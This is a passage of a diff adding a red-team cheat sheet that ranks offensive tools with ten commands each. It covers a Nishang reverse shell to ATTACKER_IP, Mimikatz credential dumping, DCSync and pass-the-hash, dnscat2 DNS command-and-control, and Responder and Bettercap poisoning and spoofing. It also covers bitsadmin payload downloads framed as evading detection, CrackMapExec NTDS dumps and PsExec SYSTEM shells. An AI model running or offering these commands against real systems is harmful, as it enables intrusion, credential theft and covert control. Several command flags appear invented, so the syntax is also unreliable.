+# 4. Kerberoast attack
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Import-Module /opt/sec/tools/PowerSploit/PowerSploit.psd1; Invoke-Kerberoast -OutputFormat hashcat" > /opt/sec/output/powersploit_kerberoast_<TIMESTAMP>.txt
+
+# 5. Enumerate domain users
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Import-Module /opt/sec/tools/PowerSploit/PowerSploit.psd1; Get-NetUser" > /opt/sec/output/powersploit_users_<TIMESTAMP>.txt
+
+# 6. Enumerate domain computers
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Import-Module /opt/sec/tools/PowerSploit/PowerSploit.psd1; Get-NetComputer" > /opt/sec/output/powersploit_computers_<TIMESTAMP>.txt
+
+# 7. Remote command execution
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Import-Module /opt/sec/tools/PowerSploit/PowerSploit.psd1; Invoke-Command -ScriptBlock { <COMMAND> } -ComputerName <TARGET_COMPUTER>" > /opt/sec/output/powersploit_remote_<TIMESTAMP>.txt
+
+# 8. Extract password hashes
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Import-Module /opt/sec/tools/PowerSploit/PowerSploit.psd1; Get-PassHashes" > /opt/sec/output/powersploit_hashes_<TIMESTAMP>.txt
+
+# 9. Mount network share
+powershell -NoProfile -ExecutionPolicy Bypass -Command "New-PSDrive -Name <DRIVE> -PSProvider FileSystem -Root <PATH>" > /opt/sec/output/powersploit_mount_<TIMESTAMP>.txt
+
+# 10. Inject DLL into process
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Import-Module /opt/sec/tools/PowerSploit/PowerSploit.psd1; Invoke-DllInjection -ProcessID <PID> -Dll <DLL_PATH>" > /opt/sec/output/powersploit_dll_<TIMESTAMP>.txt
+```
+
+---
+
+#### 5. Nishang
+**Description:** Collection of PowerShell scripts and payloads for penetration testing.
+
+**Why Best:** Wide variety of ready-to-use scripts from reverse shells to keyloggers.
+
+**Mods (Commands):**
+```bash
+# 1. Import module
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Import-Module /opt/sec/tools/Nishang/Nishang.psm1; exit" > /opt/sec/output/nishang_import_<TIMESTAMP>.txt
+
+# 2. Reverse TCP shell
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Import-Module /opt/sec/tools/Nishang/Nishang.psm1; Invoke-PowerShellTcp -Reverse -IPAddress <ATTACKER_IP> -Port <PORT>" > /opt/sec/output/nishang_tcp_<TIMESTAMP>.txt
+
+# 3. ICMP-based shell
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Import-Module /opt/sec/tools/Nishang/Nishang.psm1; Invoke-PowerShellIcmp -IPAddress <ATTACKER_IP>" > /opt/sec/output/nishang_icmp_<TIMESTAMP>.txt
+
+# 4. Encoded command for evasion
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Import-Module /opt/sec/tools/Nishang/Nishang.psm1; Out-EncodedCommand -Path /opt/sec/inputs/<SCRIPT>.ps1" > /opt/sec/output/nishang_encoded_<TIMESTAMP>.txt
+
+# 5. Encode script
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Import-Module /opt/sec/tools/Nishang/Nishang.psm1; Invoke-Encode -Path /opt/sec/inputs/<SCRIPT>.ps1 -OutFile /opt/sec/output/nishang_encoded_<TIMESTAMP>.ps1" > /opt/sec/output/nishang_encode_<TIMESTAMP>.txt
+
+# 6. Decode script
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Import-Module /opt/sec/tools/Nishang/Nishang.psm1; Invoke-Decode -Path /opt/sec/output/nishang_encoded_<TIMESTAMP>.ps1" > /opt/sec/output/nishang_decode_<TIMESTAMP>.txt
+
+# 7. Add persistence
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Import-Module /opt/sec/tools/Nishang/Nishang.psm1; Add-Persistance" > /opt/sec/output/nishang_persist_<TIMESTAMP>.txt
+
+# 8. Gather system information
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Import-Module /opt/sec/tools/Nishang/Nishang.psm1; Get-Information" > /opt/sec/output/nishang_info_<TIMESTAMP>.txt
+
+# 9. Bypass execution policy
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-ExecutionPolicy Unrestricted" > /opt/sec/output/nishang_bypass_<TIMESTAMP>.txt
+
+# 10. Get help for module
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-Help Invoke-PowerShellTcp" > /opt/sec/output/nishang_help_<TIMESTAMP>.txt
+```
+
+---
+
+#### 6. dnscat2
+**Description:** Encrypted C2 channel over DNS requests.
+
+**Why Best:** Highly evasive as DNS traffic is often allowed through firewalls.
+
+**Mods (Commands):**
+```bash
+# 1. Start server
+dnscat2-server <DOMAIN> > /opt/sec/output/dnscat2_server_<TIMESTAMP>.txt
+
+# 2. Start with config
+dnscat2-server --config /opt/sec/configs/dnscat2_config.yaml > /opt/sec/output/dnscat2_config_<TIMESTAMP>.txt
+
+# 3. Bind to specific IP
+dnscat2-server --host <IP> <DOMAIN> > /opt/sec/output/dnscat2_host_<TIMESTAMP>.txt
+
+# 4. Bind to specific port
+dnscat2-server --port <PORT> <DOMAIN> > /opt/sec/output/dnscat2_port_<TIMESTAMP>.txt
+
+# 5. Set pre-shared secret
+dnscat2-server --secret <SECRET> <DOMAIN> > /opt/sec/output/dnscat2_secret_<TIMESTAMP>.txt
+
+# 6. Client execution
+./dnscat2 --exec <COMMAND> > /opt/sec/output/dnscat2_exec_<TIMESTAMP>.txt
+
+# 7. Specify DNS server
+./dnscat2 --dns server=<IP>,port=53 > /opt/sec/output/dnscat2_dns_<TIMESTAMP>.txt
+
+# 8. Set packet size
+./dnscat2 --packet-size <SIZE> > /opt/sec/output/dnscat2_packet_<TIMESTAMP>.txt
+
+# 9. Disable domain validation
+./dnscat2 --no-domain > /opt/sec/output/dnscat2_nodomain_<TIMESTAMP>.txt
+
+# 10. Listen for connections
+./dnscat2 --listen > /opt/sec/output/dnscat2_listen_<TIMESTAMP>.txt
+```
+
+---
+
+#### 7. Responder
+**Description:** LLMNR, NBT-NS, and MDNS poisoner for credential capture.
+
+**Why Best:** Excellent for delivering payload indirectly by poisoning network requests.
+
+**Mods (Commands):**
+```bash
+# 1. Start on interface
+responder -I <INTERFACE> -o /opt/sec/output/responder_start_<TIMESTAMP>.txt
+
+# 2. Enable WPAD proxy poisoning
+responder -I <INTERFACE> -w -o /opt/sec/output/responder_wpad_<TIMESTAMP>.txt
+
+# 3. Enable basic authentication
+responder -I <INTERFACE> -r -o /opt/sec/output/responder_auth_<TIMESTAMP>.txt
+
+# 4. Enable DHCP responder
+responder -I <INTERFACE> -d -o /opt/sec/output/responder_dhcp_<TIMESTAMP>.txt
+
+# 5. Force specific challenge
+responder -I <INTERFACE> -F -o /opt/sec/output/responder_challenge_<TIMESTAMP>.txt
+
+# 6. Verbose output
+responder -I <INTERFACE> -v -o /opt/sec/output/responder_verbose_<TIMESTAMP>.txt
+
+# 7. Analyze mode
+responder -I <INTERFACE> -A -o /opt/sec/output/responder_analyze_<TIMESTAMP>.txt
+
+# 8. Fingerprint mode
+responder -I <INTERFACE> -f -o /opt/sec/output/responder_fingerprint_<TIMESTAMP>.txt
+
+# 9. Specific protocol
+responder -I <INTERFACE> -P -o /opt/sec/output/responder_protocol_<TIMESTAMP>.txt
+
+# 10. Use specific file
+responder -I <INTERFACE> -W -o /opt/sec/output/responder_file_<TIMESTAMP>.txt
+```
+
+---
+
+#### 8. Bettercap
+**Description:** Powerful modular MITM framework.
+
+**Why Best:** Intercept and modify network traffic, redirect targets to malicious sites.
+
+**Mods (Commands):**
+```bash
+# 1. Start Bettercap
+bettercap -I <INTERFACE> > /opt/sec/output/bettercap_start_<TIMESTAMP>.txt
+
+# 2. Enable network probing
+bettercap -I <INTERFACE> -eval "net.probe on" > /opt/sec/output/bettercap_probe_<TIMESTAMP>.txt
+
+# 3. Enable packet sniffer
+bettercap -I <INTERFACE> -eval "net.sniff on" > /opt/sec/output/bettercap_sniff_<TIMESTAMP>.txt
+
+# 4. Enable ARP spoofing
+bettercap -I <INTERFACE> -eval "arp.spoof on" > /opt/sec/output/bettercap_arp_<TIMESTAMP>.txt
+
+# 5. Set ARP spoof target
+bettercap -I <INTERFACE> -eval "arp.spoof.targets <TARGET_IP>" > /opt/sec/output/bettercap_target_<TIMESTAMP>.txt
+
+# 6. Enable DNS spoofing
+bettercap -I <INTERFACE> -eval "dns.spoof on" > /opt/sec/output/bettercap_dns_<TIMESTAMP>.txt
+
+# 7. Set DNS record
+bettercap -I <INTERFACE> -eval "dns.spoof.hosts <DOMAIN> <IP>" > /opt/sec/output/bettercap_dns_host_<TIMESTAMP>.txt
+
+# 8. Enable HTTP proxy
+bettercap -I <INTERFACE> -eval "http.proxy on" > /opt/sec/output/bettercap_http_<TIMESTAMP>.txt
+
+# 9. Enable HTTPS proxy
+bettercap -I <INTERFACE> -eval "https.proxy on" > /opt/sec/output/bettercap_https_<TIMESTAMP>.txt
+
+# 10. List modules
+bettercap -I <INTERFACE> -eval "modules" > /opt/sec/output/bettercap_modules_<TIMESTAMP>.txt
+```
+
+---
+
+#### 9. Mimikatz
+**Description:** Tool for extracting passwords, hashes, and Kerberos tickets.
+
+**Why Best:** De facto tool for credential access and privilege escalation.
+
+**Mods (Commands):**
+```bash
+# 1. Dump passwords
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit > /opt/sec/output/mimikatz_pass_<TIMESTAMP>.txt
+
+# 2. Dump SAM hashes
+mimikatz.exe "privilege::debug" "lsadump::sam" exit > /opt/sec/output/mimikatz_sam_<TIMESTAMP>.txt
+
+# 3. Dump LSA secrets
+mimikatz.exe "privilege::debug" "lsadump::secrets" exit > /opt/sec/output/mimikatz_lsa_<TIMESTAMP>.txt
+
+# 4. List Kerberos tickets
+mimikatz.exe "kerberos::list" exit > /opt/sec/output/mimikatz_kerb_<TIMESTAMP>.txt
+
+# 5. List certificates
+mimikatz.exe "crypto::certificates" exit > /opt/sec/output/mimikatz_cert_<TIMESTAMP>.txt
+
+# 6. Dump Kerberos tickets
+mimikatz.exe "sekurlsa::tickets" exit > /opt/sec/output/mimikatz_tickets_<TIMESTAMP>.txt
+
+# 7. DCSync attack
+mimikatz.exe "privilege::debug" "lsadump::dcsync /user:<DOMAIN>\\<USER>" exit > /opt/sec/output/mimikatz_dcsync_<TIMESTAMP>.txt
+
+# 8. Pass-the-hash
+mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:cmd" exit > /opt/sec/output/mimikatz_pth_<TIMESTAMP>.txt
+
+# 9. Pass-the-key AES128
+mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes128:<KEY> /run:cmd" exit > /opt/sec/output/mimikatz_key128_<TIMESTAMP>.txt
+
+# 10. Pass-the-key AES256
+mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<KEY> /run:cmd" exit > /opt/sec/output/mimikatz_key256_<TIMESTAMP>.txt
+```
+
+---
+
+#### 10. Bitsadmin
+**Description:** Windows built-in tool for Background Intelligent Transfer (BITS) jobs.
+
+**Why Best:** Built-in Windows tool for downloading payloads in background, evading detection.
+
+**Mods (Commands):**
+```bash
+# 1. Create BITS job
+bitsadmin /create <JOB_NAME> > /opt/sec/output/bitsadmin_create_<TIMESTAMP>.txt
+
+# 2. Add file download
+bitsadmin /addfile <JOB_NAME> <REMOTE_URL> <LOCAL_FILE_PATH> > /opt/sec/output/bitsadmin_addfile_<TIMESTAMP>.txt
+
+# 3. Resume job
+bitsadmin /resume <JOB_NAME> > /opt/sec/output/bitsadmin_resume_<TIMESTAMP>.txt
+
+# 4. Cancel job
+bitsadmin /cancel <JOB_NAME> > /opt/sec/output/bitsadmin_cancel_<TIMESTAMP>.txt
+
+# 5. Show job info
+bitsadmin /info <JOB_NAME> > /opt/sec/output/bitsadmin_info_<TIMESTAMP>.txt
+
+# 6. List all jobs
+bitsadmin /list > /opt/sec/output/bitsadmin_list_<TIMESTAMP>.txt
+
+# 7. Set priority
+bitsadmin /setpriority <JOB_NAME> <PRIORITY> > /opt/sec/output/bitsadmin_priority_<TIMESTAMP>.txt
+
+# 8. Set proxy settings
+bitsadmin /setproxy <JOB_NAME> <PROXY_SETTINGS> > /opt/sec/output/bitsadmin_proxy_<TIMESTAMP>.txt
+
+# 9. Create and resume in one step
+bitsadmin /transfer <JOB_NAME> <REMOTE_URL> <LOCAL_FILE_PATH> > /opt/sec/output/bitsadmin_transfer_<TIMESTAMP>.txt
+
+# 10. Set security flags
+bitsadmin /setsecurityflags <JOB_NAME> <FLAGS> > /opt/sec/output/bitsadmin_security_<TIMESTAMP>.txt
+```
+
+---
+
+## PHASE 5: PRIVILEGE ESCALATION (★★★★★)
+
+**Description:** Gaining higher-level permissions on compromised systems.
+
+### Ranked Tools (1-10)
+
+---
+
+#### 1. LinPEAS
+**Description:** Privilege escalation checker for Linux systems.
+
+**Why Best:** De facto standard for Linux PE with color-coded output highlighting high-risk items.
+
+**Mods (Commands):**
+```bash
+# 1. Run standard script
+./linpeas.sh -o /opt/sec/output/linpeas_std_<TIMESTAMP>.txt
+
+# 2. Run all checks including slow
+./linpeas.sh -a -o /opt/sec/output/linpeas_all_<TIMESTAMP>.txt
+
+# 3. Quiet mode
+./linpeas.sh -q -o /opt/sec/output/linpeas_quiet_<TIMESTAMP>.txt
+
+# 4. Super fast mode
+./linpeas.sh -s -o /opt/sec/output/linpeas_fast_<TIMESTAMP>.txt
+
+# 5. Save output
+./linpeas.sh -o /opt/sec/output/linpeas_output_<TIMESTAMP>.txt
+
+# 6. Verbose output
+./linpeas.sh -v -o /opt/sec/output/linpeas_verbose_<TIMESTAMP>.txt
+
+# 7. Debug mode
+./linpeas.sh -d -o /opt/sec/output/linpeas_debug_<TIMESTAMP>.txt
+
+# 8. Run from memory
+curl -s https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/linpeas.sh | sh -s -- -o /opt/sec/output/linpeas_memory_<TIMESTAMP>.txt
+
+# 9. Exclude specific path
+./linpeas.sh -e <PATH> -o /opt/sec/output/linpeas_exclude_<TIMESTAMP>.txt
+
+# 10. Show help
+./linpeas.sh -h > /opt/sec/output/linpeas_help_<TIMESTAMP>.txt
+```
+
+---
+
+#### 2. WinPEAS
+**Description:** Windows counterpart to LinPEAS for local privilege escalation.
+
+**Why Best:** Modern, thorough alternative to PowerUp with frequent updates.
+
+**Mods (Commands):**
+```bash
+# 1. Run 64-bit version
+winPEASx64.exe -o /opt/sec/output/winpeas_64_<TIMESTAMP>.txt
+
+# 2. Run 32-bit version
+winPEASx86.exe -o /opt/sec/output/winpeas_86_<TIMESTAMP>.txt
+
+# 3. Quiet mode
+winPEASx64.exe -q -o /opt/sec/output/winpeas_quiet_<TIMESTAMP>.txt
+
+# 4. Super fast mode
+winPEASx64.exe -s -o /opt/sec/output/winpeas_fast_<TIMESTAMP>.txt
+
+# 5. Save output
+winPEASx64.exe -o /opt/sec/output/winpeas_output_<TIMESTAMP>.txt
+
+# 6. Verbose output
+winPEASx64.exe -v -o /opt/sec/output/winpeas_verbose_<TIMESTAMP>.txt
+
+# 7. Debug mode
+winPEASx64.exe -d -o /opt/sec/output/winpeas_debug_<TIMESTAMP>.txt
+
+# 8. Run all checks
+winPEASx64.exe -a -o /opt/sec/output/winpeas_all_<TIMESTAMP>.txt
+
+# 9. Exclude specific path
+winPEASx64.exe -e <PATH> -o /opt/sec/output/winpeas_exclude_<TIMESTAMP>.txt
+
+# 10. Show help
+winPEASx64.exe -h > /opt/sec/output/winpeas_help_<TIMESTAMP>.txt
+```
+
+---
+
+#### 3. PowerUp (PowerSploit)
+**Description:** PowerShell script checking for common Windows privilege escalation vectors.
+
+**Why Best:** Simple, quick, and reliable for finding common misconfigurations.
+
+**Mods (Commands):**
+```bash
+# 1. Run all checks
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Import-Module /opt/sec/tools/PowerSploit/Privesc/PowerUp.ps1; Invoke-AllChecks" > /opt/sec/output/powerup_all_<TIMESTAMP>.txt
+
+# 2. Save findings to file
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Import-Module /opt/sec/tools/PowerSploit/Privesc/PowerUp.ps1; Invoke-AllChecks -Path /opt/sec/output/powerup_file_<TIMESTAMP>.txt"
+
+# 3. Find modifiable services
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Import-Module /opt/sec/tools/PowerSploit/Privesc/PowerUp.ps1; Get-ModifiableService" > /opt/sec/output/powerup_services_<TIMESTAMP>.txt
+
+# 4. Find modifiable scheduled tasks
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Import-Module /opt/sec/tools/PowerSploit/Privesc/PowerUp.ps1; Get-ModifiableScheduledTask" > /opt/sec/output/powerup_tasks_<TIMESTAMP>.txt
+
+# 5. Find unquoted service paths
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Import-Module /opt/sec/tools/PowerSploit/Privesc/PowerUp.ps1; Get-UnquotedService" > /opt/sec/output/powerup_unquoted_<TIMESTAMP>.txt
+
+# 6. Get service details
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Import-Module /opt/sec/tools/PowerSploit/Privesc/PowerUp.ps1; Get-ServiceDetail -ServiceName <SERVICE_NAME>" > /opt/sec/output/powerup_detail_<TIMESTAMP>.txt
+
+# 7. Abuse weak service
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Import-Module /opt/sec/tools/PowerSploit/Privesc/PowerUp.ps1; Invoke-ServiceAbuse -Name <SERVICE_NAME> -Command <COMMAND>" > /opt/sec/output/powerup_abuse_<TIMESTAMP>.txt
+
+# 8. Check AlwaysInstallElevated
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Import-Module /opt/sec/tools/PowerSploit/Privesc/PowerUp.ps1; Get-RegistryAlwaysInstallElevated" > /opt/sec/output/powerup_install_<TIMESTAMP>.txt
+
+# 9. Get ACL of directory
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Import-Module /opt/sec/tools/PowerSploit/Privesc/PowerUp.ps1; Get-PathAcl -Path <DIRECTORY>" > /opt/sec/output/powerup_acl_<TIMESTAMP>.txt
+
+# 10. Generate HTML report
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Import-Module /opt/sec/tools/PowerSploit/Privesc/PowerUp.ps1; Invoke-AllChecks -HTML -Path /opt/sec/output/powerup_html_<TIMESTAMP>.html"
+```
+
+---
+
+#### 4. Windows-Exploit-Suggester
+**Description:** Compares patch levels against Microsoft vulnerability database.
+
+**Why Best:** Automates finding unpatched CVEs for local privilege escalation.
+
+**Mods (Commands):**
+```bash
+# 1. Update database
+python windows-exploit-suggester.py --update --database /opt/sec/db/exploit-suggester_<TIMESTAMP>.xls
+
+# 2. Analyze systeminfo
+python windows-exploit-suggester.py --database /opt/sec/db/exploit-suggester_<TIMESTAMP>.xls --systeminfo /opt/sec/inputs/<SYSTEMINFO_FILE>.txt > /opt/sec/output/suggester_analyze_<TIMESTAMP>.txt
+
+# 3. List all known exploits
+python windows-exploit-suggester.py -d /opt/sec/db/exploit-suggester_<TIMESTAMP>.xls -i /opt/sec/inputs/<SYSTEMINFO_FILE>.txt -l > /opt/sec/output/suggester_list_<TIMESTAMP>.txt
+
+# 4. Recommend exploits
+python windows-exploit-suggester.py -d /opt/sec/db/exploit-suggester_<TIMESTAMP>.xls -i /opt/sec/inputs/<SYSTEMINFO_FILE>.txt -r > /opt/sec/output/suggester_recommend_<TIMESTAMP>.txt
+
+# 5. Show only missing patches
+python windows-exploit-suggester.py -d /opt/sec/db/exploit-suggester_<TIMESTAMP>.xls -i /opt/sec/inputs/<SYSTEMINFO_FILE>.txt -s > /opt/sec/output/suggester_missing_<TIMESTAMP>.txt
+
+# 6. Filter by CVE
+python windows-exploit-suggester.py -d /opt/sec/db/exploit-suggester_<TIMESTAMP>.xls -i /opt/sec/inputs/<SYSTEMINFO_FILE>.txt -f CVE-2020-<NUMBER> > /opt/sec/output/suggester_cve_<TIMESTAMP>.txt
+
+# 7. Save output
+python windows-exploit-suggester.py -d /opt/sec/db/exploit-suggester_<TIMESTAMP>.xls -i /opt/sec/inputs/<SYSTEMINFO_FILE>.txt -o /opt/sec/output/suggester_output_<TIMESTAMP>.txt
+
+# 8. Prioritize by risk
+python windows-exploit-suggester.py -d /opt/sec/db/exploit-suggester_<TIMESTAMP>.xls -i /opt/sec/inputs/<SYSTEMINFO_FILE>.txt -p > /opt/sec/output/suggester_priority_<TIMESTAMP>.txt
+
+# 9. Test for specific exploit
+python windows-exploit-suggester.py -d /opt/sec/db/exploit-suggester_<TIMESTAMP>.xls -i /opt/sec/inputs/<SYSTEMINFO_FILE>.txt -t MS17-010 > /opt/sec/output/suggester_test_<TIMESTAMP>.txt
+
+# 10. Verbose output
+python windows-exploit-suggester.py -d /opt/sec/db/exploit-suggester_<TIMESTAMP>.xls -i /opt/sec/inputs/<SYSTEMINFO_FILE>.txt -v > /opt/sec/output/suggester_verbose_<TIMESTAMP>.txt
+```
+
+---
+
+#### 5. John the Ripper
+**Description:** Password cracking tool for hash analysis.
+
+**Why Best:** Essential for cracking password hashes during escalation.
+
+**Mods (Commands):**
+```bash
+# 1. Basic wordlist attack
+john --wordlist=/opt/sec/wordlists/passwords.txt /opt/sec/inputs/<HASH_FILE> --format=<FORMAT> > /opt/sec/output/john_basic_<TIMESTAMP>.txt
+
+# 2. Specify hash format
+john --format=<FORMAT> /opt/sec/inputs/<HASH_FILE> > /opt/sec/output/john_format_<TIMESTAMP>.txt
+
+# 3. Show cracked passwords
+john --show /opt/sec/inputs/<HASH_FILE> > /opt/sec/output/john_show_<TIMESTAMP>.txt
+
+# 4. Incremental brute-force
+john --incremental /opt/sec/inputs/<HASH_FILE> > /opt/sec/output/john_inc_<TIMESTAMP>.txt
+
+# 5. Use wordlist with rules
+john --rules /opt/sec/inputs/<HASH_FILE> --wordlist=/opt/sec/wordlists/passwords.txt > /opt/sec/output/john_rules_<TIMESTAMP>.txt
+
+# 6. Show generated passwords
+john --stdout --wordlist=/opt/sec/wordlists/passwords.txt --rules > /opt/sec/output/john_stdout_<TIMESTAMP>.txt
+
+# 7. Run benchmark
+john --test > /opt/sec/output/john_bench_<TIMESTAMP>.txt
+
+# 8. Restore session
+john --restore > /opt/sec/output/john_restore_<TIMESTAMP>.txt
+
+# 9. Name a session
+john --session=<SESSION_NAME> /opt/sec/inputs/<HASH_FILE> > /opt/sec/output/john_session_<TIMESTAMP>.txt
+
+# 10. Use specific pot file
+john --pot=/opt/sec/output/john_pot_<TIMESTAMP>.pot /opt/sec/inputs/<HASH_FILE> > /opt/sec/output/john_pot_<TIMESTAMP>.txt
+```
+
+---
+
+#### 6. Hashcat
+**Description:** GPU-accelerated password cracking tool.
+
+**Why Best:** Significantly faster than John when using GPUs.
+
+**Mods (Commands):**
+```bash
+# 1. MD5 wordlist attack
+hashcat -m 0 -a 0 /opt/sec/inputs/<HASH_FILE> /opt/sec/wordlists/passwords.txt -O -o /opt/sec/output/hashcat_md5_<TIMESTAMP>.txt
+
+# 2. NTLM wordlist attack
+hashcat -m 1000 -a 0 /opt/sec/inputs/<HASH_FILE> /opt/sec/wordlists/passwords.txt -O -o /opt/sec/output/hashcat_ntlm_<TIMESTAMP>.txt
+
+# 3. NetNTLMv2 wordlist attack
+hashcat -m 5600 -a 0 /opt/sec/inputs/<HASH_FILE> /opt/sec/wordlists/passwords.txt -O -o /opt/sec/output/hashcat_netntlm_<TIMESTAMP>.txt
+
+# 4. Kerberos TGS wordlist attack
+hashcat -m 13100 -a 0 /opt/sec/inputs/<HASH_FILE> /opt/sec/wordlists/passwords.txt -O -o /opt/sec/output/hashcat_kerberos_<TIMESTAMP>.txt
+
+# 5. Mask attack (4 digits)
+hashcat -m 0 -a 3 /opt/sec/inputs/<HASH_FILE> ?d?d?d?d -O -o /opt/sec/output/hashcat_mask_<TIMESTAMP>.txt
+
+# 6. Combinator attack
+hashcat -m 0 -a 1 /opt/sec/inputs/<HASH_FILE> /opt/sec/wordlists/passwords.txt /opt/sec/wordlists/passwords.txt -O -o /opt/sec/output/hashcat_comb_<TIMESTAMP>.txt
+
+# 7. Hybrid attack (wordlist + mask)
+hashcat -m 0 -a 6 /opt/sec/inputs/<HASH_FILE> /opt/sec/wordlists/passwords.txt ?d?d -O -o /opt/sec/output/hashcat_hybrid_<TIMESTAMP>.txt
+
+# 8. Hybrid attack (mask + wordlist)
+hashcat -m 0 -a 7 /opt/sec/inputs/<HASH_FILE> ?d?d /opt/sec/wordlists/passwords.txt -O -o /opt/sec/output/hashcat_hybrid2_<TIMESTAMP>.txt
+
+# 9. Use rules
+hashcat -m 0 -a 0 /opt/sec/inputs/<HASH_FILE> /opt/sec/wordlists/passwords.txt -r /usr/share/hashcat/rules/best64.rule -O -o /opt/sec/output/hashcat_rules_<TIMESTAMP>.txt
+
+# 10. Show cracked passwords
+hashcat -m 0 /opt/sec/inputs/<HASH_FILE> --show > /opt/sec/output/hashcat_show_<TIMESTAMP>.txt
+```
+
+---
+
+#### 7. CrackMapExec
+**Description:** Post-exploitation tool for automating Active Directory assessment.
+
+**Why Best:** Automates lateral movement and privilege escalation.
+
+**Mods (Commands):**
+```bash
+# 1. Execute command via SMB
+crackmapexec smb <TARGET_IP> -u <USER> -p <PASSWORD> --exec-method smbexec -x "whoami" > /opt/sec/output/cme_smb_<TIMESTAMP>.txt
+
+# 2. Execute via WMI
+crackmapexec smb <TARGET_IP> -u <USER> -H <HASH> --exec-method wmiexec -x "whoami" > /opt/sec/output/cme_wmi_<TIMESTAMP>.txt
+
+# 3. Enumerate shares
+crackmapexec smb <TARGET_IP> -u <USER> -p <PASSWORD> --shares > /opt/sec/output/cme_shares_<TIMESTAMP>.txt
+
+# 4. Enumerate users
+crackmapexec smb <TARGET_IP> -u <USER> -p <PASSWORD> --users > /opt/sec/output/cme_users_<TIMESTAMP>.txt
+
+# 5. Enumerate groups
+crackmapexec smb <TARGET_IP> -u <USER> -p <PASSWORD> --groups > /opt/sec/output/cme_groups_<TIMESTAMP>.txt
+
+# 6. Dump SAM hashes
+crackmapexec smb <TARGET_IP> -u <USER> -p <PASSWORD> --sam > /opt/sec/output/cme_sam_<TIMESTAMP>.txt
+
+# 7. Dump LSA secrets
+crackmapexec smb <TARGET_IP> -u <USER> -p <PASSWORD> --lsa > /opt/sec/output/cme_lsa_<TIMESTAMP>.txt
+
+# 8. Execute via DCOM
+crackmapexec smb <TARGET_IP> -u <USER> -p <PASSWORD> --dcom > /opt/sec/output/cme_dcom_<TIMESTAMP>.txt
+
+# 9. Execute via WMI with output
+crackmapexec smb <TARGET_IP> -u <USER> -p <PASSWORD> --wmi > /opt/sec/output/cme_wmi2_<TIMESTAMP>.txt
+
+# 10. Dump NTDS.dit from DC
+crackmapexec smb <TARGET_IP> -u <USER> -p <PASSWORD> --ntds > /opt/sec/output/cme_ntds_<TIMESTAMP>.txt
+```
+
+---
+
+#### 8. PsExec
+**Description:** Windows Sysinternals tool for remote process execution.
+
+**Why Best:** Simple and effective for running commands with SYSTEM privileges.
+
+**Mods (Commands):**
+```bash
+# 1. Interactive cmd on remote system
+PsExec.exe \\\\<TARGET_IP> -u <DOMAIN>\\<USER> -p <PASSWORD> cmd > /opt/sec/output/psexec_cmd_<TIMESTAMP>.txt
+
+# 2. Run as SYSTEM
+PsExec.exe \\\\<TARGET_IP> -s cmd > /opt/sec/output/psexec_system_<TIMESTAMP>.txt
+
+# 3. Copy and execute file
+PsExec.exe \\\\<TARGET_IP> -d -c /opt/sec/inputs/<LOCAL_FILE> <REMOTE_FILE> > /opt/sec/output/psexec_copy_<TIMESTAMP>.txt
+
+# 4. Run as logged-in user
+PsExec.exe \\\\<TARGET_IP> -e cmd > /opt/sec/output/psexec_user_<TIMESTAMP>.txt
+
+# 5. Run interactively
+PsExec.exe \\\\<TARGET_IP> -i cmd > /opt/sec/output/psexec_interactive_<TIMESTAMP>.txt
+
+# 6. Run with elevated privileges
+PsExec.exe \\\\<TARGET_IP> -h cmd > /opt/sec/output/psexec_elevated_<TIMESTAMP>.txt
+
+# 7. Set connection timeout
+PsExec.exe \\\\<TARGET_IP> -n <TIMEOUT> cmd > /opt/sec/output/psexec_timeout_<TIMESTAMP>.txt
+
+# 8. Specify service name
+PsExec.exe \\\\<TARGET_IP> -r <SERVICE_NAME> cmd > /opt/sec/output/psexec_service_<TIMESTAMP>.txt
+
+# 9. Set working directory
+PsExec.exe \\\\<TARGET_IP> -w <WORKING_DIR> cmd > /opt/sec/output/psexec_working_<TIMESTAMP>.txt
+
+# 10. Accept EULA
+PsExec.exe \\\\<TARGET_IP> -accepteula cmd > /opt/sec/output/psexec_eula_<TIMESTAMP>.txt
+```
+
+---
+
+#### 9. BeRoot
+**Description:** Tool for finding Windows privilege escalation vectors.
+
+**Why Best:** Modern approach with different checks than PowerUp.
+
+**Mods (Commands):**
+```bash
+# 1. Run Windows executable
+beRoot.exe -o /opt/sec/output/beroot_std_<TIMESTAMP>.txt
+
+# 2. Run Python version
+python beRoot.py -o /opt/sec/output/beroot_py_<TIMESTAMP>.txt
+
+# 3. List all potential vectors
+beRoot.exe -list > /opt/sec/output/beroot_list_<TIMESTAMP>.txt
+
+# 4. Run specific check
+beRoot.exe -check <CHECK_NAME> > /opt/sec/output/beroot_check_<TIMESTAMP>.txt
+
+# 5. Generate report
+beRoot.exe -report /opt/sec/output/beroot_report_<TIMESTAMP>.txt
+
+# 6. Output as JSON
+beRoot.exe -json /opt/sec/output/beroot_json_<TIMESTAMP>.json
+
+# 7. Output as XML
+beRoot.exe -xml /opt/sec/output/beroot_xml_<TIMESTAMP>.xml
+
